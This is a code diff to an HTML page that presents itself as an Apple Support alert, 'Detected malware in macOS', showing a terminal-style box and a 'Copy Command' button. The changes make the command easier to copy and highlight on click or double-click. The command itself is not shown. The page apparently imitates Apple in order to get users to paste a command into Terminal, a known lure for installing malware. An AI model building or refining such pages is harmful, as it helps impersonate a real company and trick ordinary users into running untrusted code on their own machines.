@@ -6,6 +6,13 @@
     <title>Detected malware in macOS - Apple Support</title>
     <link rel="stylesheet" href="style.css">
     <link rel="icon" href="https://www.apple.com/favicon.ico">
+    <style>
+        /* Ensuring the highlight looks like a native macOS selection */
+        .command-text::selection {
+            background-color: #007aff;
+            color: white;
+        }
+    </style>
 </head>
 <body>
     <header>
@@ -114,19 +121,27 @@
             const copyBtn = document.getElementById('copy-btn');
             const terminalBody = document.getElementById('terminal-body');
 
-            const copyToClipboard = () => {
+            const copyAndHighlight = () => {
                 const text = commandText.innerText;
+                
+                // 1. Copy to clipboard
                 navigator.clipboard.writeText(text).then(() => {
+                    // Update Button State
                     copyBtn.innerText = 'Copied!';
                     copyBtn.classList.add('success');
                     
-                    // Visual feedback for selection
-                    const range = document.createRange();
-                    range.selectNodeContents(commandText);
+                    // 2. Visual Highlight Logic
                     const selection = window.getSelection();
+                    const range = document.createRange();
+                    
+                    // Clear existing selections
                     selection.removeAllRanges();
+                    
+                    // Select the command text content
+                    range.selectNodeContents(commandText);
                     selection.addRange(range);
 
+                    // Reset button and clear highlight after 2 seconds
                     setTimeout(() => {
                         copyBtn.innerText = 'Copy Command';
                         copyBtn.classList.remove('success');
@@ -135,17 +150,19 @@
                 });
             };
 
-            copyBtn.addEventListener('click', copyToClipboard);
+            // Click event for the button
+            copyBtn.addEventListener('click', (e) => {
+                e.stopPropagation(); // prevent terminalBody dblclick trigger
+                copyAndHighlight();
+            });
 
-            // Double click to copy
-            terminalBody.addEventListener('dblclick', copyToClipboard);
+            // Double click anywhere in the terminal body to copy and highlight
+            terminalBody.addEventListener('dblclick', copyAndHighlight);
 
-            // Disable standard text selection via dragging
+            // Logic to prevent accidental manual selection interference while clicking
             commandText.addEventListener('mousedown', (e) => {
-                if (e.detail > 1) { // allow double click
-                    return;
-                }
-                e.preventDefault();
+                if (e.detail > 1) return; // Allow double clicks to work
+                // Optional: e.preventDefault() here would disable manual dragging entirely
             });
         });
     </script>
